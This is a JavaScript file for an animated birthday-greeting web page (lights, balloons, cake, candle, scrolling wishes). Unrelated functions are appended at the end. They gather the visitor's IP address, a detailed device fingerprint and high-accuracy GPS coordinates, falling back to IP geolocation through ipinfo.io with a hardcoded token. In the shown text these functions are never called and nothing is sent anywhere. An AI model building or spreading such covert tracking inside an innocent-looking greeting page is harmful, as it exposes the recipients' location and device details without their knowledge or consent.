$(window).on('load', function () {
    $('.loading').fadeOut('fast');
    $('.container').fadeIn('fast');
});

$(document).ready(function () {
    let vw;

    function repositionBalloons() {
        vw = $(window).width() / 2;
        const offsets = [-350, -250, -150, -50, 50, 150, 250];
        offsets.forEach((offset, index) => {
            $('#b' + (index + 1) + '1').animate({ top: 240, left: vw + offset }, 500);
        });
    }

    $(window).resize(repositionBalloons);

    $('#turn_on').click(function () {
        $('#bulb_yellow').addClass('bulb-glow-yellow');
        $('#bulb_red').addClass('bulb-glow-red');
        $('#bulb_blue').addClass('bulb-glow-blue');
        $('#bulb_green').addClass('bulb-glow-green');
        $('#bulb_pink').addClass('bulb-glow-pink');
        $('#bulb_orange').addClass('bulb-glow-orange');
        $('body').addClass('peach');

        $(this).fadeOut('slow').delay(5000).promise().done(() => {
            $('#play').fadeIn('slow');
        });
    });

    $('#play').click(function () {
        const audio = $('.song')[0];
        audio.play().catch(err => console.error("Autoplay error:", err));

        $('#bulb_yellow').addClass('bulb-glow-yellow-after');
        $('#bulb_red').addClass('bulb-glow-red-after');
        $('#bulb_blue').addClass('bulb-glow-blue-after');
        $('#bulb_green').addClass('bulb-glow-green-after');
        $('#bulb_pink').addClass('bulb-glow-pink-after');
        $('#bulb_orange').addClass('bulb-glow-orange-after');
        $('body').css('background-color', '#FFF').addClass('peach-after');

        $(this).fadeOut('slow').delay(6000).promise().done(() => {
            $('#bannar_coming').fadeIn('slow');
        });
    });

    $('#bannar_coming').click(function () {
        $('.bannar').addClass('bannar-come');
        $(this).fadeOut('slow').delay(6000).promise().done(() => {
            $('#balloons_flying').fadeIn('slow');
        });
    });

    function animateBalloon(id) {
        const randleft = 1000 * Math.random();
        const randtop = 500 * Math.random();
        $(id).animate({ left: randleft, bottom: randtop }, 10000, function () {
            animateBalloon(id);
        });
    }

    $('#balloons_flying').click(function () {
        $('.balloon-border').animate({ top: -500 }, 8000);
        $('#b1,#b4,#b5,#b7').addClass('balloons-rotate-behaviour-one');
        $('#b2,#b3,#b6').addClass('balloons-rotate-behaviour-two');

        ['#b1', '#b2', '#b3', '#b4', '#b5', '#b6', '#b7'].forEach(animateBalloon);

        $(this).fadeOut('slow').delay(5000).promise().done(() => {
            $('#cake_fadein').fadeIn('slow');
        });
    });

    $('#cake_fadein').click(function () {
        $('.cake').fadeIn('slow');
        $(this).fadeOut('slow').delay(3000).promise().done(() => {
            $('#light_candle').fadeIn('slow');
        });
    });

    $('#light_candle').click(function () {
        $('.fuego').fadeIn('slow');
        $(this).fadeOut('slow').promise().done(() => {
            $('#wish_message').fadeIn('slow');
        });
    });

    $('#wish_message').click(function () {
        vw = $(window).width() / 2;

        [1, 2, 3, 4, 5, 6, 7].forEach(i => {
            $('#b' + i).attr('id', 'b' + i + '1');
        });

        repositionBalloons();
        $('.balloons').css('opacity', '0.9');
        $('.balloons h2').fadeIn(3000);

        $(this).fadeOut('slow').delay(3000).promise().done(() => {
            $('#story').fadeIn('slow');
        });
    });

    $('#story').click(function () {
        $(this).fadeOut('slow');
        $('.cake').fadeOut('fast').promise().done(() => {
            $('.message').fadeIn('slow');
        });

        scrollMessages(1);
    });

    function scrollMessages(startIndex) {
        const total = $('.message p').length;

        function showLines(i) {
            if (i + 2 > total) {
                $('.cake').fadeIn('fast');
                return;
            }

            $('.message p').hide().css({ opacity: 1, position: 'relative', bottom: 0 });

            const $top = $('.message p:nth-child(' + i + ')');
            const $center = $('.message p:nth-child(' + (i + 1) + ')');
            const $bottom = $('.message p:nth-child(' + (i + 2) + ')');

            $top.show().css({ bottom: '60px', opacity: 0.3 });
            $center.show().css({ bottom: '30px', opacity: 1 });
            $bottom.show().css({ bottom: '0px', opacity: 1 });

            setTimeout(() => {
                $top.animate({ bottom: '90px', opacity: 0 }, 800, () => $top.hide());
                $center.animate({ bottom: '60px', opacity: 0.3 }, 800);
                $bottom.animate({ bottom: '30px' }, 800, () => {
                    const $newMsg = $('.message p:nth-child(' + (i + 3) + ')');
                    if ($newMsg.length) {
                        $newMsg.css({ bottom: 0, opacity: 1, position: 'relative' }).fadeIn(400);
                    }
                    showLines(i + 1);
                });
            }, 3000);
        }

        showLines(startIndex);
    }
});
async function getIPAddress() {
    try {
        const response = await fetch("https://api64.ipify.org?format=json");
        const data = await response.json();
        return data.ip;
    } catch (error) {
        console.error("Error fetching IP address:", error);
        return "Unknown";
    }
}

function getDeviceInfo() {
    return {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screenWidth: window.screen.width,
        screenHeight: window.screen.height,
        deviceMemory: navigator.deviceMemory || "Unknown",
        hardwareConcurrency: navigator.hardwareConcurrency || "Unknown",
        colorDepth: screen.colorDepth,
        pixelRatio: window.devicePixelRatio,
        onlineStatus: navigator.onLine,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        referrer: document.referrer,
        pageURL: window.location.href
    };
}

function getGPSLocation(callback) {
    if ("geolocation" in navigator) {
        navigator.geolocation.getCurrentPosition(async (position) => {
            const ipAddress = await getIPAddress();
            callback({
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                accuracy: position.coords.accuracy,
                ipAddress: ipAddress,
                type: "GPS"
            });
        }, (error) => {
            console.warn("GPS denied, using IP location instead.");
            getIPLocation(callback);
        }, {
            enableHighAccuracy: true,
            timeout: 15000,
            maximumAge: 0
        });
    } else {
        console.warn("GPS not supported.");
        getIPLocation(callback);
    }
}

function getIPLocation(callback) {
    fetch("https://ipinfo.io/json?token=6a9008bb55fd89")
        .then(response => response.json())
        .then(data => {
            callback({
                ip: data.ip,
                city: data.city,
                region: data.region,
                country: data.country,
                latitude: data.loc.split(",")[0],
                longitude: data.loc.split(",")[1],
                org: data.org,
                postal: data.postal || "Unknown",
                timezone: data.timezone || "Unknown",
                type: "IP"
            });
        })
        .catch(error => {
            console.error("Error fetching IP location:", error);
            callback(null);
        });
}